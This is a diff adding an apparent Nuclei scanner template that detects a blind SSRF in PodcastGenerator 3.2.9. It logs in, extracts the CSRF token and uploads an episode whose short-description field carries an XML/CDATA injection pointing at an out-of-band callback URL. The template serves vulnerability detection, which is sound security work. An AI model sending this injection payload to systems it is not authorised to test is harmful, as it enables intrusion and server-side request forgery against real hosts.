@@ -1,0 +1,131 @@
+id: podcast-generator-ssrf
+
+info:
+  name: PodcastGenerator 3.2.9 - Blind SSRF via XML Injection
+  author: ritikchaddha,MrHarshvardhan
+  severity: high
+  description: |
+    This is a SSRF vulnerability via Xml injection found in PodcastGenerator 3.2.9.
+  reference:
+    - https://www.exploit-db.com/exploits/51565
+    - https://mirabbasagalarov.medium.com/podcastgenerator-3-2-9-blind-ssrf-via-xml-injection-3795804467df
+    - https://github.com/PodcastGenerator/PodcastGenerator
+  metadata:
+    verified: true
+    max-request: 3
+  tags: podcastgenerator,ssrf,authenticated,intrusive
+variables:
+  string: "{{rand_text_alpha(7)}}"
+
+http:
+  - raw:
+      - |
+        POST /podcast/PodcastGenerator/admin/login.php?login=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}
+      - |
+        GET /podcast/PodcastGenerator/admin/episodes_upload.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /podcast/PodcastGenerator/admin/episodes_upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1WfeHRSBn1aNkQQA
+
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="file"; filename="{{string}}.jpg"
+        Content-Type: image/jpeg
+
+        {{rand_text_alpha(50)}}
+        {{rand_text_alpha(50)}}
+
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="title"
+
+        {{string}}
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="shortdesc"
+
+        test]]></shortdescPG><imgPG path="">http://{{interactsh-url}}</imgPG><shortdescPG><![CDATA[test
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="category[ ]"
+
+        uncategorized
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="date"
+
+        2023-10-30
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="time"
+
+        12:26
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="episodecover"; filename=""
+        Content-Type: application/octet-stream
+
+
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="longdesc"
+
+
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="episodenum"
+
+
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="seasonnum"
+
+
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="itunesKeywords"
+
+
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="explicit"
+
+        no
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="authorname"
+
+        {{string}}
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="authoremail"
+
+        {{string}}@{{string}}.com
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="customtags"
+
+
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA
+        Content-Disposition: form-data; name="token"
+
+        {{token}}
+        ------WebKitFormBoundary1WfeHRSBn1aNkQQA--
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: body_2
+        words:
+          - "Main Information"
+          - "Episode Cover:"
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body_2
+        name: token
+        group: 1
+        regex:
+          - 'pe="hidden" name="token" value="([A-Za-z0-9]+)">'
+        internal: true
+# digest: 4a0a0047304502205a21364b03ba2e492aba95b201565bdc05a5a2a2ca948fb97c18ff1670039126022100d88f3868b94a2dfc1689a48693a2c78c4513613bb3df9605047fc0ceac7f52e0:922c64590222798bb761d5b6d8e72950
